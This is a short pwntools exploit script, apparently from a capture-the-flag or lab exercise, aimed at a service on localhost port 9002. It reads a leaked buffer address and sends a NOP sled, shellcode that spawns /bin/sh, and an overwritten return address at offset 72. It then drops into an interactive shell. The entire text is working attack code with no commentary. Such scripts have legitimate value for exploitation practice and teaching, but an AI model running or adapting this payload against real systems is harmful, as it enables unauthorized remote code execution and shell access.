from pwn import *

context(arch='amd64', os='linux')
p = remote('localhost', 9002)

p.recvuntil(b"Buffer address: ")
buffer_addr = int(p.recvline().strip(), 16)
log.info(f"Buffer address: {hex(buffer_addr)}")

offset = 72

shellcode = asm(shellcraft.popad())
shellcode += asm(shellcraft.sh())
padding = asm('nop') * (offset - len(shellcode))  # NOP sled
payload = flat([
    padding,
    shellcode,
    buffer_addr
]

)
p.recvuntil(b"plz don't hack me :(")
p.send(payload)

p.interactive()